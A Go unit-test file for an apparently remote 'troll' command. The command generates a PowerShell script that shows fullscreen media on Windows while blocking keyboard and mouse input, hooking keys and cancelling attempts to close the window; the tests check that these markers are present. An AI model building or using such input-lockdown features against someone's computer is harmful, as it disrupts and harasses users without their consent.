package commands

import (
	"runtime"
	"strings"
	"testing"
)

func TestPlayTrollUsage(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("non-windows refusal path only")
	}
	if _, err := playTroll(""); err == nil || !strings.Contains(err.Error(), "not supported") {
		t.Fatalf("err = %v, want not supported", err)
	}
	if _, err := stopTroll(); err == nil || !strings.Contains(err.Error(), "not supported") {
		t.Fatalf("stop err = %v, want not supported", err)
	}
}

func TestTrollScriptSafetyMarkers(t *testing.T) {
	// Video path must contain every safety rail: hard timeout, BlockInput
	// off on close, no taskbar, topmost, MediaFailed unblock.
	script, err := trollScript(`C:\m\v.mp4`, ".mp4", 300, true, `C:\m\status.txt`)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"BlockInput($false)",
		"BlockInput($true)",
		"ShowInTaskbar = $false",
		"Topmost = $true",
		"WindowStyle = 'None'",
		"MediaFailed",
		"Add_Closed",
		// Lockdown rails (v1.46.1): close-cancel, key hook, re-assert.
		"allowClose",
		"Cancel = $true",
		"SetWindowsHookEx",
		"Uninstall()",
		// Playback proof (v1.46.1): status handshake + no-proof watchdog.
		"MediaOpened",
		"timeout-no-media",
		"failed: ",
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("video script missing safety marker %q", want)
		}
	}
	if strings.Contains(script, `"C:`) {
		t.Fatalf("path double-quoted")
	}

	gscript, err := trollScript(`C:\m\loop.gif`, ".gif", 60, false, `C:\m\status.txt`)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"BlockInput($false)",
		"BlockInput($true)",
		"TopMost = $true",
		"ShowInTaskbar = $false",
		"FormBorderStyle = 'None'",
		"Add_FormClosed",
		// Lockdown rails (v1.46.1).
		"allowClose",
		"Cancel = $true",
		"SetWindowsHookEx",
		"Uninstall()",
		"Add_FormClosing",
		// Playback proof (v1.46.1).
		"'opened'",
		"failed: ",
	} {
		if !strings.Contains(gscript, want) {
			t.Fatalf("gif script missing safety marker %q", want)
		}
	}
}

func TestTrollSecondsClampLogic(t *testing.T) {
	// playTroll clamps via maxTrollSeconds; assert the constants hold.
	if defaultTrollSeconds <= 0 || defaultTrollSeconds > maxTrollSeconds {
		t.Fatalf("default %d max %d", defaultTrollSeconds, maxTrollSeconds)
	}
	if maxTrollSeconds != 3600 {
		t.Fatalf("maxTrollSeconds = %d, want 3600 (1h hard cap)", maxTrollSeconds)
	}
}

func TestTrollExtKind(t *testing.T) {
	for _, ext := range []string{".mp4", ".mov", ".avi", ".wmv", ".mkv", ".webm", ".m4v", ".mpg"} {
		if trollExtKind(ext) != "video" {
			t.Fatalf("%s should be video", ext)
		}
	}
	for _, ext := range []string{".gif", ".png", ".jpg", ".jpeg", ".bmp"} {
		if trollExtKind(ext) != "image" {
			t.Fatalf("%s should be image", ext)
		}
	}
	for _, ext := range []string{"", ".dat", ".exe", ".ps1", ".txt"} {
		if trollExtKind(ext) != "" {
			t.Fatalf("%s should be rejected", ext)
		}
	}
}

func TestTrollExtForContentType(t *testing.T) {
	cases := map[string]string{
		"video/mp4": "mp4", "image/gif": "gif", "image/png": "png",
		"video/x-matroska": "mkv", "text/html": "",
		"video/mp4; charset=binary": "mp4",
	}
	for ct, want := range cases {
		got := trollExtForContentType(ct)
		if want == "" && got != "" {
			t.Fatalf("%s should map to nothing, got %s", ct, got)
		}
		if want != "" && got != "."+want {
			t.Fatalf("%s mapped to %s, want .%s", ct, got, want)
		}
	}
}
